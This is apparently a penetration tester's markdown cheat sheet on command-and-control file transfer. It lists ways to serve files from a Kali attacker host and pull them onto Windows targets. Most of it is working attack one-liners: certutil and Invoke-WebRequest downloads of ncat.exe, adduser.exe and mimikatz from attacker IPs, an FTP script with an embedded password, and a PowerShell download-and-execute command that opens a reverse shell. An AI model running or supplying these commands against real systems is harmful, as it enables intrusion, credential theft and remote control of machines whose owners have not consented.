

# C2

##### HTTP
```python
python -m SimpleHTTPServer $port
```

```python
python3 -m http.server $port
```

##### FTP
```
sudo systemctl start pure-ftpd
```
(Setup FTP Server on Linux: [isetup-ftp.sh](file:////home/kali/Documents/linuxAdministration/))

##### WebDAV
```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/ATP23/webdav/
```

##### TFTP (Useful on XP)
```bash
sudo atftpd --daemon --port 69 /tftp` )
```


# On the target

## Bidirectional

##### HTTP
```powershell
certutil.exe -urlcache -split -f "http://192.168.45.182:8000/ncat.exe"
```

##### SSH
```bash
scp $file $user@$hip:"C:\\Users\\$user\\Downloads"
```

```bash
scp $user@$hip:'C:\\Users\\$user\\Downloads\\data.zip' .
```

##### FTP
```powershell
echo "open 192.168.45.182 21" > ftp.txt; echo "USER offsec" >> ftp.txt; echo "alexrudolf" >> ftp.txt; echo "bin" >> ftp.txt; echo "GET ncat.exe" >> ftp.txt; echo "bye" >> ftp.txt; ftp -v -n -s:ftp.txt
```
(dir on linux: `/ftphome/`)
> Error `I won't open a connection to xx.xx.xx.xx (only to xx.xx.xx.xx)` means that passive mode is required. The windows ftp client does not support passive mode

##### TFTP (Useful on XP)
```powershell
tftp -i $ip put <filename>
```


## Download to Windows

```powershell
iwr -uri http://$hip/adduser.exe -Outfile adduser.exe
```

Download File (HTTP)
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$hip/$filename$','C:\Users\offsec\Desktop\wget.exe')"
```

```powershell
Invoke-WebRequest -Uri 'http://192.168.45.177:80/mimikatz32.exe' -OutFile 'C:\Users\marcus\Desktop\mimi32.exe'
```

Download and Execute String  (HTTP)
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:$port/Invoke-PowershellTcp.ps1'); Invoke-PowershellTcp -Reverse -IPAddress $ip -Port $port"
```



## Windows -> Linux


